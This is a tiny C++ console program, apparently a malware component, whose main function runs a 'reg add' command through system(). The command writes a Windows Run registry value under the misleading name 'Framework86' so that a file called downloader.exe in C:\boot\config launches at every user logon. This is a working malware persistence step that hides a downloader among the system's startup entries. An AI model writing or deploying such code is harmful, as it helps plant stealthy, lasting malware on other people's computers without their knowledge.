// Batch_Files.cpp : Defines the entry point for the console application.
//


#include <stdlib.h>
#include<stdio.h>
#include<conio.h>




int main()
{
    char reg[] = "reg add HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run /f /v Framework86 /t REG_SZ /d C:\\boot\\config\\downloader.exe";
    system(reg);

	return 0;
}
